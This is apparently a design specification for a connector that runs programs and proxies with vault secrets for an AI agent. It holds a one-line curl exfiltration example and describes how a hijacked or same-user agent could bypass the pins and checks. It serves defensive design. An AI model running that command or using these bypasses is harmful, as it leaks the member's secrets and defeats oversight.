  - **How it runs:** `"<System32>\cmd.exe" /d /e:on /v:off /s /c
    ""<bat>" "a1" …"`, with `cmd.exe` from `GetSystemDirectory` (never
    `ComSpec`), resolved, checked and held like any program; `/d` skips
    AutoRun, `/e:on` forces command extensions on (npm's shims need
    `%~dp0` and `setlocal`), `/v:off` turns off `!` expansion. A batch
    command line over 8,191 characters is `bad_request`.
  - **The file:** held (below) and hashed through the hold; it must not
    start with `MZ`, and `#!` is refused as for any program. Only on
    NTFS (renaming a folder above a held file was shown refused on NTFS
    only). `cmd.exe` reopens the file by path for each command, so
    before the process is resumed the path is reopened and must name
    the held file (final name and identity, no reparse point), or the
    process is ended. The hold lasts until the process ends.
  - **Symbolic links:** a batch file that only an administrator can
    change may run; any other (a pinned one included) runs only if the
    connector's user cannot make symbolic links (Developer Mode off and
    no `SeCreateSymbolicLinkPrivilege`), since a link set on the held
    leaf while `cmd.exe` runs could redirect the run; a failed check
    counts as "can". So with Developer Mode on, a pinned npm shim in
    `%APPDATA%\npm` is refused (`program_not_found`). (0.1.16, AG14)
    In the separate-account mode this rule no longer decides npm
    tools. A launcher in the member's profile (`%APPDATA%\npm`) cannot
    run because a runner account cannot read the member's profile and
    because, in this mode, every program, pinned or not, must sit in an
    administrator-only folder (owner a, GC #15787). The tools for runs go
    in an administrator-only folder (`npm config set prefix "C:\Program
    Files\npm-global"`, GC #15751, #15763).
  - **npm shims by name:** an absolute path without an extension that
    names a regular non-`MZ` file with `<path>.cmd` beside it is run as
    that `.cmd`, which is what is hashed and, once A3.8b sends runs,
    sent as `program` and pinned (only `.cmd` is tried).
- **The program's content** (VAULT-MESSAGING 0.85.3; owner decision of
  2026-11-05, option b). The connector reads the resolved file once,
  computes its SHA-256 as it reads, and sends it as `item.run`'s
  `sha256`. The vault pins the hash together with the path it ran from
  (`path`): it refers the run to the phone when the item has no pin for
  that program yet, or a different hash or path, and records the new
  pin when the member approves. (Owner decision of 2026-11-05, kept as
  the fallback) The connector applies the check of a program only an administrator can change (`program_not_found` otherwise: a program that the connector's user can change, or that sits in a folder that user can change, by the `--run-path` check below) to every resolved program except one equal to its entry's pinned `path`, which the catalog gives. So a pinned program moved to a changeable place is checked again. (0.1.16: not in the separate-account mode, where every program must be in an administrator-only folder, GC #15787.)
  So the first run of a bound program,
  and the first run after any change to the file (an update or a swap)
  or from another place (a copy of the file in another folder), is
  always asked on the phone, with the path and the fingerprint (and the
  old ones when they changed); a matching file then runs under the
  item's settings as before. Symbolic links are resolved first, so a
  program whose link points into a versioned folder (Homebrew's
  `Cellar`, for example) gets a new path, and one approval, at every
  update.
- **Run exactly what was hashed** (the lead's design note,
  2026-11-05). Never hash by path and then start by path: the file
  could be swapped in between, or, on Linux and macOS, written in
  place. (chosen; not in the spec. (0.1.15) A3.8a's tests showed, on
  NTFS as a standard user, that renaming the program's folder and the
  folder above it is refused while the program is held; ReFS was not
  tested.)
  - **Windows** (NTFS or ReFS volumes only, others refused, (owner decision 2026-11-05)): the
    connector opens the file with sharing that refuses writing and
    deleting (`FILE_SHARE_READ` only, not following a reparse point; an
    open that fails because another process has it open
    for writing refuses the run; the final name must equal the resolved
    path), hashes it through that handle, and
    holds the handle until the process has started. It starts the
    process suspended from the same resolved path (as
    `lpApplicationName`), checks that the started image is the held
    file, and only then resumes it: it opens the path
    `QueryFullProcessImageNameW` gives for the new process and compares
    its volume serial number and file index
    (`GetFileInformationByHandle`) with the held handle's (a path-based
    reopen, sound only because the held handle stops the file itself
    from changing);
    otherwise it ends the process and refuses the run. (0.1.19, the
    separate-account mode, the lead's call) In that mode the launcher
    (A3.10c) starts the program, and the launcher does this check: it
    reports the image's volume serial number and file index to the
    service, which compares them with the file it holds, and the
    program runs only when the service resumes it. Measured (vettid/vettid-agent#57): the service can read the started image itself
    (`QueryFullProcessImageNameW`). After the launcher has exited and
    the service has closed its handles to it, the service waits until
    the job holds only the program, checks that the program's thread is
    the program's (`GetProcessIdOfThread`), that the program is in the
    job (`IsProcessInJob`), and that its image is the pinned file; only then does it resume the program. The service's own read of the image decides; the launcher's check is a pre-check. The child's
    environment holds `NoDefaultCurrentDirectoryInExePath=1`, so the
    programs it starts are not looked up in its directory.
  - **Linux**: the connector copies the file into a sealed memory file
    (`memfd_create` with `MFD_ALLOW_SEALING` and `MFD_EXEC`, which needs
    Linux 6.3 or later: on `EINVAL` it retries without `MFD_EXEC`; then
    `F_SEAL_WRITE`, `F_SEAL_GROW`, `F_SEAL_SHRINK`, (0.1.18) on Linux 6.3
    and later `F_SEAL_EXEC`, then `F_SEAL_SEAL`)
    while hashing it, and starts that (through its `/proc/self/fd/<n>`
    path, which Go's process start can use). (0.1.15) Only an ELF file
    is run this way (so nothing runs through binfmt_misc), and one over
    512 MiB is refused (chosen; not in the spec). No one can change sealed
    content. A program that finds its own files beside itself (through
    `/proc/self/exe`) may then fail. Where the system refuses to run a
    memory file (`vm.memfd_noexec` = 2), the run is refused
    (`run_failed`) with its text; the connector never falls back to
    starting by path.
  - **Scripts** (owner decision 2026-11-05): a file that starts with `#!` is
    refused as a program (`program_not_found`), on every platform. This
    rules out npm and pip command-line tools as bound programs. A
    script's interpreter, which does the work, is not pinned, and on Linux a script cannot start
    from a sealed memory file. The agent can run the interpreter with
    the script as an argument; that run is always referred
    (VAULT-MESSAGING §10.11).
  - **macOS**, which has neither a write-refusing open nor sealed
    files: the connector copies the file into `run/<id>/bin/` while
    hashing and starts the copy. This narrows the gap but does not
    close it: an agent running as the same user can rewrite the copy
    between the hash and the start. A program that finds its own files
    beside itself may fail.

  Just before the start the connector resolves `argv[0]` again and
  refuses the run (`program_not_found`) if the path changed. The
  `program` sent and shown stays the resolved original path.
- **What the pin does not cover, said plainly** (VAULT-MESSAGING
  0.85.3). It pins the one file started, at its path. It does not pin
  what that program loads or reads: libraries beside it (on Windows a
  DLL in the program's folder is loaded first, and one in its `cwd`
  can be too), modules and plugins, or configuration in the user's own
  profile (`HOME`, `USERPROFILE` and `APPDATA` are passed, and a
  `~/.gitconfig` can make even `/usr/bin/git` run a command). Nor does
  it stop a process of the same user from opening the running program
  and reading its memory or environment (the lead's L4 of 2026-11-05:
  inherent to a same-user agent). On macOS the copy narrows the swap
  gap without closing it (above). So a program installed where only an
  administrator can change it is safer, but not safe, against an agent
  that runs as the connector's user. The README says so, and that the
  connector must not run as an administrator or root. (0.1.16) In the
  separate-account mode `HOME`, `USERPROFILE` and `APPDATA` are fresh
  folders of each run, so a profile file such as `~/.gitconfig` is not
  read.
  (0.1.15, the lead's a on GC #15388) **A batch file's pin covers the
  batch file only.** An npm shim (`.cmd`) runs `node` and the
  `node_modules\…\*.js` it names; neither is pinned, and the "only an
  administrator can change" rule covers the `.cmd`'s folder and those
  above it, not `node_modules` below it (a pinned path gets the path
  rules alone). So "this program's fingerprint was approved" means the
  launcher, not the code it runs; AA8's approval wording is to say so
  (owed with AA8). Known limits, from #42's review (analysis, not
  demonstrated): an agent can put a `node.exe` beside a pinned shim in
  `%APPDATA%\npm`, which the shim would then run with the secret,
  unreferred; a DosDevices `C:` link made by the same user could
  redirect `cmd.exe`'s per-command reopen; the fixed-path folders on
  the child's `PATH` are not checked as administrator-only; batch
  files are refused on ReFS. The separate account (below) is the full
  answer for programs in administrator-only folders, which in that mode
  is every program (owner a, GC #15787): the agent can neither change
  them nor read a run's secret.
- **A separate account is the only full protection** (0.1.10). An
  agent that runs as the same operating-system account as the
  connector can, while a run lasts, open the `file` secret, read the
  process's environment and memory, and attach to it; no check in the
  connector can stop that, since the system treats them as the same
  user. So a member who needs a secret kept from the agent itself runs
  the agent under another account than the connector and its runs.
  Today the MCP client starts the connector as its own child, in the
  agent's account. The owner has chosen (2026-11-05, option c) a mode
  that runs the connector and its runs under a separate account,
  specified in a design note (vettid.org #539; it needs a local channel
  that AG1a ruled out for the same-account connector, and now allows
  for this mode, AG14). (0.1.16) The plan: A3.10a to A3.10c and the
  installers (A5.5 for Windows, A5.6 for Linux; macOS is A5.4). A3.8b and
  A3.9 start after A5.5; A5.6 gates Linux runs only, A5.4 macOS runs.
  Until they are built, the README says so
  plainly.
- **Runs and proxies only in the separate-account mode** (0.1.16, AG14;
  AGENT-SEPARATE-ACCOUNT §2, §3, §5, §6, §8; nothing built).
  - **Only there.** `leash.run_with_secret` and `leash.open_proxy` work
    only in a service whose accounts are not the member's or an
    administrator's. Without one they answer `separate_account_required`
    (§11); a stub never falls back to running the connector in its own
    process. The same-account connector's `status` says runs and
    proxies are off (§11). macOS runs and proxies wait for A5.4 and
    signed builds (Q4 c).
  - **Under a runner account**, never the connector's: each pairing has
    two runner accounts, one per run slot (at most 2 runs at once, as
    above). A slot is used again only once every process of the
    previous run is gone (note §2).
  - **`--run-path` and `--run-env`** are no longer the stub's flags
    (an agent could set them in its own MCP configuration). They live
    in the service's configuration file, which only an administrator
    can change; a stub given them refuses them with a NEW text (§11).
    The `--run-path` check below tests the member's
    account, the runner accounts and any non-administrator. **On Windows
    the rule is the owner as well as the ACL:** the owner of the folder
    and of each folder above it must be Administrators, SYSTEM or
    TrustedInstaller, or else an effective (not inherit-only) OWNER
    RIGHTS ACE must grant neither `WRITE_DAC` nor `WRITE_OWNER`; and no ACE may grant any SID other than
    Administrators, SYSTEM and TrustedInstaller (the service's own SID
    is not exempt) the rights of the 0.1.15 check: for the folder
    itself, any change; for each folder above it, only what replaces it
    (`DELETE`, `FILE_DELETE_CHILD` on its parent, `WRITE_DAC`,
    `WRITE_OWNER`), not adding a folder, since every user may add
    folders to `C:\`. An inherit-only ACE does not count for the
    folder it sits on. The walk runs on the fully resolved path (links
    and junctions resolved first, for a `--run-path` folder as for a
    program), and the program file's own owner and ACL are checked the
    same way as its folder. **Every program, pinned or not** (owner a, GC
    #15787), must sit where only an administrator can change it, each
    folder up its path checked the same way: in this mode a pin fixes
    which file runs but no longer stands in for the folder check, since
    the agent could otherwise put a DLL or a `node.exe` beside a pinned
    program. A folder the member's account can change, such as
    `%APPDATA%\npm`, is refused. npm tools for runs go in an
    administrator-only folder (`npm config set prefix "C:\Program
    Files\npm-global"`, GC #15751, #15763), whose owner must then be
    set to Administrators, since Windows makes an elevated user the
    owner of a folder they create (`icacls "C:\Program Files\npm-global"
    /setowner Administrators /T`; A5.5's README gives it). `--run-env` values come
    from that file, never the service's own environment.
  - **The environment.** Each run gets fresh folders of its own for
    `HOME` or `USERPROFILE`, `APPDATA`, `LOCALAPPDATA` and the
    temporary folders, removed when it ends; the runner's profile is
    never loaded. These replace "the connector's environment when
    present" in the minimal set below, which a runner account would not
    have (note §2, §3, §6). Programs that read their known folders from
    Windows rather than the variables may fail and are noted as
    unsupported until a profile mechanism is tested.
  - **Where a run's files live.** Its `work/`, `tmp/` and `secret/`
    folders are never in a folder the member's account can read
    (note §3).
- **The directory.** `cwd` is an absolute path to an existing directory;
  absent, the run's `work/` (below). (0.1.12) The connector sends
  `program` and `cwd` as cleaned absolute paths: no trailing separator
  (except the root itself), no empty, `.` or `..` element, and no `:`
  in any element after the root, on any system (VAULT-MESSAGING 0.91.0
  §10.11; the scope is an open owner question). Each is at most 4,096
  bytes, with no control, Cf, Zl or Zp character, so a connector can
  refuse such a path itself with a plain notice. The vault refuses
  any other form. (0.1.17, VAULT-MESSAGING 0.93.0; not built) **What
  changes with `folders`.**
  - **The connector learns whether the vault is 0.93.0 or later from
    the catalog** (the lead's call; S10 rejected a capability list, so
    no capability name or `vault.status` member is added). From 0.93.0
    every catalog entry for an item with a run way carries `folders`,
    an empty list when the binding has none. **The decision comes only
    from a catalog read in the current vault session**, never from the
    state file, and the catalog is read again after a reconnect; it is
    read before a run when the connector has no entry for the item. It
    sends `inputs`, `output`, a member-folder `cwd`, or **omits `cwd`
    for `work/`**, only for an item whose entry has `folders`. For an
    item whose entry lacks it, the vault predates 0.93.0: the connector
    answers `vault_too_old` to a request that needs those members and
    **keeps sending a `work/` `cwd` as today**. Once the entry has
    `folders`, it never sends a `cwd` for `work/`; if the vault still
    answers `cwd_not_allowed {where: cwd}` for its own `work/` path, it
    reads the catalog again and **retries once without `cwd`**. The
    copy-back recheck (below) reads the current binding then.
  - **"Read only" is enforced here** (owner decision a, GC #15855). The
    service refuses a run whose `cwd` matches a binding entry with
    `write: false` while the pairing's share grants that folder write
    (`cwd_not_allowed`, the NEW text of §11 that names the folder and
    both ways out, and never a value). The member makes the share
    read-only (`vettid-agent share --name <n> <folder>` without
    `--write`) or turns the entry's `write` on. **Also (the lead's call,
    fail secure):** for an entry with `write: false`, the run is refused,
    with the same NEW text, if **the runner's token is granted any write
    or delete right on the `cwd` folder itself**, whatever granted it.
    The launcher, holding the handle as the runner, makes the check and
    reports it to the service, which decides: on Windows `AccessCheck`
    on the **program's** token (the restricted token the launcher builds,
    A3.10c, not the launcher's own) against the folder's security descriptor for
    `FILE_ADD_FILE`, `FILE_ADD_SUBDIRECTORY`, `FILE_WRITE_ATTRIBUTES`,
    `FILE_WRITE_EA` (0x10), `FILE_DELETE_CHILD`, `DELETE`, `WRITE_DAC` and
    `WRITE_OWNER`; on
    POSIX `faccessat(…, W_OK)` as the runner. **Write access deeper
    inside the folder is not checked, said plainly;** `share` without
    `--write` removes inherited write for the runners by an explicit
    deny entry (A5.5a). **Said plainly:** a run
    can reach every folder shared with that computer's pairing. An
    item's `folders` decides where a run may start (its `cwd`) and where
    files are copied, not everything a program run there can read.
    Per-item runner accounts would close that; they are not the design
    (Q3 a).
  - **The `cwd` it sends is the path as given, cleaned, never
    resolved**, so the vault compares the text the member approved. On
    POSIX the connector refuses a `\` in a `cwd`, an input path or an
    output folder with a plain notice (the vault reads `\` as a
    separator on every system, so a POSIX folder named `a\b` is
    refused, not guessed).
  - **The folder is checked on the computer, from a handle held by the runner** (the lead's call): the connector's runner opens and checks the folder:
    the run starter (A3.10c's launcher, running as the runner account) opens
    `cwd` **as the runner**, because the service never opens a member folder
    and the share grants nothing to the service's own account: on Windows a
    directory handle, opened without `FILE_SHARE_DELETE`; on POSIX
    `O_DIRECTORY|O_NOFOLLOW` at each element. It resolves the **final path
    from that handle** (`GetFinalPathNameByHandle`; on POSIX the path of the
    descriptor, not `realpath` on the name) and reports it to the service,
    which checks it against the approved entry by the operating system's own
    rules for case, short names, links and junctions. **Only when the service resumes it does the process start in the held folder:** `fchdir` on the
    descriptor before `exec` on POSIX; on Windows the handle is held, still
    without `FILE_SHARE_DELETE`, until the process has started. So nothing
    can be swapped between the check and the use (the lead's call). **On Windows (0.1.19, the lead's call) the launcher is started by the service with `CreateProcessWithLogonW`, builds a restricted token from its own token and starts the program on it with `CreateProcessAsUser`, suspended, inside the same job, in the held folder (A3.10c).** **On Windows the launcher also refuses a `cwd` with a reparse point
    anywhere in the path as given** (each element opened with
    `FILE_FLAG_OPEN_REPARSE_POINT` and checked, as `O_NOFOLLOW` does on
    POSIX), **and a `cwd` whose final path from the handle differs from the
    path given beyond case and separators**; and it starts the process with
    the **final path from the handle** as its working folder, never the path
    as given (the lead's call). A folder that is not shared with the runner (A5.5a) fails to open and is refused with the working-folder text of §11, as is a path the service finds outside the approved entry (`cwd_not_allowed`).
- **Files in and out** (0.1.17, Q9 a; VAULT-MESSAGING 0.93.0 §10.11;
  not built; A3.10d). They need a `folders` entry, never a share: the
  stub, which runs as the member, reads the inputs and writes the
  outputs, and the service, a different account, handles the copies.
  - **Where.** Inputs are written read-only into the run's `work/in/`;
    outputs are read from the run's `work/out/`. The connector sets
    `VETTID_IN` and `VETTID_OUT` to those two absolute paths in the
    program's environment whenever the run has `inputs` or `output`
    (the run's `cwd` may be a member folder); the two names are refused
    in the request's `name` and `env`.
  - **The service checks, not the stub** (the stub is the member's
    process, which the agent can steer): the caps (at most 16 files,
    16 MiB each, 64 MiB in all, and the approved `size` of each file)
    are enforced on the bytes the service receives; an input whose real
    size is not its approved `size` stops the run before it starts. A
    link met when reading an input is hygiene only, since the agent can
    read the file anyway.
  - **Outputs** are checked by the service **after every process of the
    runner is gone** (never while one could still write), on the opened
    handle: each element opened without following links (`openat` with
    `O_NOFOLLOW`; on Windows directory handles opened with
    `FILE_FLAG_OPEN_REPARSE_POINT`); a regular file, owned by the slot's
    runner, link count 1, not a reparse point or link; a flat name (no
    `..`, no `:`, no reserved Windows name, no `\` on POSIX); only the
    names the request listed. Past a cap, or for any file that fails,
    the file is dropped and the answer says so.
  - **The binding is checked again at copy-back**, against the current
    binding (as a run's approval is judged again): if the output folder
    is no longer in `folders`, or no longer has `write`, nothing is
    copied back, and the answer says so.
  - **The copy-back.** The stub writes into the output folder, each file
    created new (`O_CREAT|O_EXCL`, `CREATE_NEW`), never overwriting (a
    numbered suffix if the name is taken), never through a link in the
    destination (it resolves the destination from a handle as above).
    Each output is redacted over its bytes, as standard output is
    (§4.9 "Redaction"), by the service before the bytes leave it for the
    stub; a binary file in which the value appears is changed by that, and
    the answer says which files were redacted. The limit is as for
    standard output: an encoding the redaction does not know gets
    through.
  - **The result** gains `outputs: [{name, size, copied, redacted}]`,
    one per named output (`size` of the bytes written; `copied` false,
    with its `reason`: `size`, `link`, `owner`, `binding` or `missing`).
- **The run's own directory** (the lead's answer, 2026-11-05). Each run
  has `run/<id>/` under the state directory, owner-only (0700; on
  Windows the owner-only DACL of A1.1), holding `tmp/` (for `TMPDIR`,
  or `TEMP` and `TMP`), `work/` (the default `cwd`) and `secret/` (for
  the `file` secret), and on macOS `bin/` (above). When the run ends,
  the secret file is overwritten and the whole of `run/<id>/` removed.
  (0.1.16, AG14) In the separate-account mode it is outside the state
  folder, owned by the slot's runner and unreadable by the member: made
  by the run helper on POSIX (under its own run root, 0711, root-owned),
  by the service on Windows (with an access list for that runner only).
  Whoever made it empties `run/` at each start, so a crash leaves
  nothing past the next start (the helper's or the service's wording is
  settled in A3.10c and A5.6).
- **The environment.** The process never inherits the connector's
  environment. It gets only this minimal set, each copied from the
  connector's environment when present: on POSIX `HOME`, `USER`,
  `LOGNAME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ`; on Windows
  `USERPROFILE`, `USERNAME`, `HOMEDRIVE`, `HOMEPATH`, `APPDATA`,
  `LOCALAPPDATA`. Set by the connector: `PATH` (the fixed search path
  above), `TMPDIR` (POSIX) or `TEMP` and `TMP` (Windows), pointing at
  the run's `tmp/`; (0.1.10; chosen, not in the spec) on Windows also
  `SystemRoot` and `windir` from the system's Windows directory,
  `SystemDrive` from its volume, and `PATHEXT` as `.COM;.EXE`, never
  copied from the connector's environment. All of these belong to the
  minimal set for the name rule below. Then the names the operator allows with `--run-env NAME`
  (never the agent), then the request's `env` (at most 32 names, values
  at most 4,096 bytes), then the secret's variable. A name in `env` or
  `name` must match `^[A-Z_][A-Z0-9_]{0,63}$` and must not be one of the
  minimal set, `PATH`, `TMPDIR`, `TEMP`, `TMP`, or start with `LD_` or
  `DYLD_` (`bad_request`). So proxies, cloud credentials, the MCP
  client's tokens and loader variables never reach the process unless
  the operator allows them by name.
- **An allowlist for the request's `env`** (VAULT-MESSAGING 0.85.3;
  owner decision of 2026-11-05, option a). The phone's approval shows
  the variables, but a run under `each: false` is not asked, and some
  variables make a program load other code. So each bound program in
  the item lists the names a run of it may set, chosen by the member on
  the phone, empty by default; any other name is refused
  (`env_not_allowed`, from the vault, or from the connector before it
  asks when the catalog already shows the name is not listed). A run of
  an unbound item carries no `env`. Under the allowlist the connector
  and the vault both refuse the code-loading names VAULT-MESSAGING
  §10.11 lists (`GIT_…`, `NODE_OPTIONS`, `PYTHONPATH`,
  `XDG_CONFIG_HOME` and others), even when listed: a backstop, since
  such a list is never complete. The operator's `--run-env` names are
  checked by the name rule above only, not by this list (owner decision
  2026-11-05).
- **The secret** reaches the process one way, as `how` says: `env`, in
  the variable `name`; `stdin`, written to its standard input, which is
  then closed (otherwise standard input is the null device); `file`, in
  a file in a new directory under `run/` (directory 0700, file 0600; on
  Windows the owner-only DACL of A1.1), whose path is in the variable
  `name` and replaces each argument that is exactly `{secret_file}`.
  The file is the run's `secret/` (above). The file is overwritten and
  deleted when the process ends; `run/` is emptied at every start, so a
  crash leaves nothing past the next one.
- **The process.** Its own process group (POSIX `setsid`) or a Windows
  job object that kills its processes when closed; no terminal.
  `timeout_seconds` 1–600, default 60; at the limit the whole group gets
  SIGTERM, then SIGKILL after 5 s (Windows: the job is ended), and
  `timed_out` is true. At most 2 runs at once per connector: a third
  is answered `rate_limited_local` with the "Two programs running"
  text of §11, and the connector reserves the slot before it sends
  `item.run`, so a value never arrives for a run that cannot start (the
  lead's answer, 2026-11-05). (chosen; not in the spec) A run waiting
  for the phone holds its slot until it is answered, denied or lapses.
- **At a referral** the connector logs the full `sha256` and the
  resolved path (no value, argument or variable), so a member can check
  the phone's 16-digit fingerprint against the whole hash.
- **A referred run starts at once** (the lead's answer, 2026-11-05).
  When the approval arrives, the connector starts the process in the
  background; it does not wait for `leash.check_status`. It keeps only
  the redacted answer for `check_status`, for the 10 minutes of AG9,
  and zeroes the value when the process ends, as for any run. When the
  connector exits, it kills its runs' process groups and jobs.
  (0.1.16, AG14; note §5) In the separate-account mode "the connector"
  is the service: its runs end with it (a job object on Windows, a
  systemd unit on Linux, a launchd job per run on macOS, which the
  service removes and a restarted service ends). A run whose stub has
  left goes on to its own time limit and its redacted answer is kept
  for AG9's 10 minutes; proxies close when the stub that opened them
  leaves. (0.1.16, the lead's call) The on-demand service does not stop
  while a run is in flight (a referred run still waiting for approval
  after its stub left counts) or a run's answer is still kept for
  `check_status` (10 minutes); its idle stop counts from then.
- **The output.** Standard output and standard error are each read up
  to 1 MiB; beyond that the rest is read and discarded and `truncated`
  is true. Each is redacted (below) and then returned up to 64 KiB, as
  UTF-8 with invalid bytes replaced. `truncated` is true whenever what
  is returned is shorter than what the process wrote, the 64 KiB cut
  included (the lead's answer, 2026-11-05). The answer is `{exit_code,
  signal?, timed_out, stdout, stderr, truncated, redacted}`, where
  `redacted` counts the replacements. It holds no value, so it is sent
  in both MCP forms as other tools are.
- **The operator's flags** (the lead's answer and the owner's decision
  of 2026-11-05, option a). `--run-path DIR`: an absolute path to an
  existing directory, at most 16. `--run-env NAME`: at most 32, each by
  the name rule above. The connector refuses to start on a bad value,
  with the texts of §11. It also refuses a `--run-path` directory that
  the connector's user can change (the owner's decision), or that sits
  below a folder the user could replace (owner decision 2026-11-05), or that is a
  junction or other reparse point: a
  program found there could be replaced by an agent running as that
  user. (chosen; not in the spec) On Windows this is the Windows access
  check for the connector's own token: for the directory itself,
  adding files or folders, writing, deleting, or changing its
  permissions or owner; for each folder above it, only what replaces
  it: deleting or renaming it (`DELETE` on it, or deleting children of
  its parent) or changing its permissions or owner, since every user
  may add folders to `C:\`. On POSIX it is the directory, or a folder
  above it, writable by its group or others, owned by a user other
  than root, or writable by the connector's user (`access(W_OK)`, so
  ACLs count). The check is for the connector's user; another
  non-administrator user who can change the folder is caught only by
  the group and others bits on POSIX, not on Windows.
  (0.1.16, AG14) In the separate-account mode these are not command
  flags: the service reads them from its administrator-only
  configuration, and the check tests the member's account and every
  non-administrator, as the `--run-path` bullet above says (on
  Windows: the owner and ACL rule of the `--run-path` bullet above,
  with no exemption for the service's SID; on POSIX a group or other
  write bit, or an owner other than root). A stub given the old
  flags refuses them (§11).
- **The value** stays in the connector's memory from the vault's answer
  until the process ends, then it is zeroed. It is never logged.
- **The limit, said plainly.** A command chosen by a hijacked agent can
  send the secret anywhere: `curl -d @"$F" https://elsewhere` is one
  line. A bound program can still be steered by its arguments. This is
  why the phone shows the program, every argument, the directory and
  how the secret is passed, why the vault flags shells and inline code,
  and why an item can bind programs and ask before each run. A run is
  for a member who reads the command.

**Redaction** (runs and proxies). Every occurrence of any of these is
replaced with `[REDACTED]`: the value's bytes; its base64, standard and
URL-safe, each with and without padding; its hex, lower and upper case;
its percent-encoding (RFC 3986 unreserved characters kept, hex digits
in either case), and the form encoding with `+` for a space; its JSON
string escaping as Go's `encoding/json` writes it, with and without
`\/`, and with control characters as `\u00XX`. Redaction runs over the
whole captured stream (a proxy: a sliding window that holds back the
longest form's length less one byte), before truncation. It does not
find other encodings: compressed or encrypted output, base64 of a
longer text that contains the value at another offset, or part of the
value. A value shorter than 8 bytes is still redacted, and may also
replace unrelated text.

**Proxy** (`leash.open_proxy`, `leash.close_proxy`; vault `item.proxy`).

- **The model: a base URL on loopback, plain HTTP to the proxy, TLS from
  the proxy to the host.** `leash.open_proxy` answers `base_url`
  `http://127.0.0.1:<port>/<token>/` (`token`: 32 random bytes,
  base64url). The agent points its HTTP client or SDK at `base_url`
  instead of `https://<host>/` (API SDKs commonly take a base URL), and
  a request for `base_url` + path goes to `https://<host>/` + path.
  Rejected: an HTTPS `CONNECT` proxy (inside a tunnel it does not
  terminate, the proxy cannot add a header); terminating TLS for the
  bound host (the client would have to trust a local certificate
  authority, which can impersonate any site to that client, and many
  clients pin or ignore added roots); a forward proxy for absolute-form
  `http://` URLs (it makes the agent write the API's URL as plain HTTP,
  and a client may then send other credentials of its own in clear on
  loopback).
- **The listener.** On 127.0.0.1 only, a random port, one per open
  proxy, at most 4 at once (`proxy_limit`). It accepts a request only if
  its `Host` is exactly `127.0.0.1:<port>`, its path starts with
  `/<token>/` and it has no `Origin` header (so no web page can use it,
  DNS rebinding included); otherwise 403 with no detail. `CONNECT`,
  absolute-form targets and protocol upgrades get 405. This is the
  connector's only listener (AG1a's exception): it exists only while an
  approved proxy lasts, and the token keeps other local processes out
  unless they can read the agent's memory or history; a token in a
  history is of no use after `expires_at`.
- **Forwarding.** Method, path, query, body and end-to-end headers. The
  proxy drops hop-by-hop and `Proxy-*` headers and any copy of the
  item's header the agent sent (the agent can neither set nor read it),
  sends `Accept-Encoding: identity`, and adds `<header>: <prefix><value>`
  from the item's settings (for example `Authorization: Bearer …`). It
  connects directly to the host (no proxy variables), with TLS 1.2 or
  later, the certificate verified against the system roots for that
  host, and `Host` and SNI set to it. Request bodies at most 16 MiB,
  responses at most 64 MiB, each request at most 120 s.
- **Other hosts and redirects.** Only the one host the approval named is
  ever contacted. Redirects are never followed: a `Location` on the same
  host is rewritten to `base_url`; one to any other host or scheme turns
  the response into 502 with `{"code": "redirect_refused"}`. "The same
  host" means `https`, the same name compared without case and without
  a trailing dot, and the same port, an absent port meaning 443;
  anything else is another host (the lead's answer, 2026-11-05).
- **Echoes.** Response headers and body are redacted as above, and
  `Content-Length` recomputed (chunked when it changes). A response
  with a `Content-Encoding` other than `identity` cannot be scanned and
  becomes 502 `{"code": "encoded_response"}`.
- **The end.** At `expires_at` (`seconds` 60–3,600, default 900, never
  past the access session's end), on `leash.close_proxy`, when the
  access session ends, the vault is held, the agent is suspended or the
  connector exits: the listener closes and the value is zeroed. The
  connector learns of a hold only from `vault.status`, so while any
  proxy is open it sends `vault.status` in the background at most once
  a minute, and closes every proxy when the answer shows the vault held
  or its daily check due (the lead's answer, 2026-11-05).
- **A referred proxy opens at once** (the lead's answer, 2026-11-05).
  When the approval arrives the connector opens the listener; it keeps
  only `base_url` and `expires_at` for `leash.check_status`, and the
  proxy's time runs from the approval.
- **Tests.** The test TLS root is an unexported field set only from
  `_test.go` files: no flag, variable or file sets it, so a member's
  build has no way to trust another root (the lead's answer,
  2026-11-05).
- **The limit, said plainly.** The agent can make any request the API
  allows with the key, including asking the API to show the key: a full
  echo is redacted, a partial one (the last four characters) is not.
  The binding keeps the key away from every other host.

**Reveal** (`leash.request_secret`; vault `item.get`, only for an item
whose ways include `reveal`).

- **Sent once, as text only.** The tool declares no output schema and
  answers with one text block holding the JSON result, without
  `structuredContent`. MCP says a tool that returns structured content
  SHOULD also return it serialized as text, for clients that do not
  read `structuredContent`; following that would put the value in the
  answer twice. Text alone reaches every client and the model, and with
  no structured content the recommendation does not apply. Every other
  tool keeps both forms (they carry no value).
- **Through `leash.check_status` too** (the lead's answer, 2026-11-05).
  A referred reveal returns its value through `leash.check_status`, so
  a `check_status` result for an `item.get` takes the same form: one
  text block, no `structuredContent`. `leash.check_status` declares no
  output schema. Its results for runs and proxies keep both forms (they
  carry no value). Golden files cover both.
- **No `readOnlyHint`** (owner decision, 2026-10-18; vettid-agent #36).
  `leash.request_secret` carries no `readOnlyHint`: handing a value to
  the agent's app is not free of effect, and a client must not treat
  the call as safe to run without asking. The other tools keep theirs.
- **The description** says the value may stay in the agent app's
  history, and that the agent should use `leash.execute_action`,
  `leash.run_with_secret` or `leash.open_proxy` when one of them does
  the job.
- **Every reveal is asked on the phone** (owner decision, 2026-10-18),
  even within the rule's limits, and says the agent's app may keep the
  value in its history (§11, Android drafts); so does the setting that
  allows reveal for an item.

## 5. Test vectors

The vault's vectors are authoritative (VAULT-MESSAGING §16). Reusing the
vault's packages means the connector does not re-derive them; it still
runs the ones its own code depends on, against the pinned vault commit,
so that a dependency update that changes a format fails here. Copies in
`testdata/vectors/` with a `SOURCE.md` recording the vettid-vault commit
and each file's `sha256sum`. **A vector that stops matching is a
stop-and-report item, never a skip.**

| File (source) | Checks | PR |
|---|---|---|
| vettid-vault `testdata/vectors/invite.json` | the pairing code forms of §6.4 (bare, URL, `vettid://`), `t`, hash and expiry checks in `internal/pairing` | A2.1 |
| `…/handshake.json` | the SAS shown equals the vector's (through the imported handshake) | A2.1 |
| `…/leash.json` | `leashwire.VerifyPresented` accepts the two delegations and statements and refuses the altered ones; the connector's presentation output is byte-identical to the vector's members | A3.1 |
| `testdata/vectors/statefile.json` (new, generated by a test-only function with fixed keys and nonces) | the state file format of §4.2 for the passphrase protector; tampered header, wrong key, truncated file refused | A1.1 |
| `testdata/mcp/*.json` (new, golden files) | `tools/list` output and each tool's input schema, so that a change to the agent-facing contract is visible in review | A3.3 |

CI runs gitleaks with an allowlist for the public vector values.

## 6. Phases and PRs

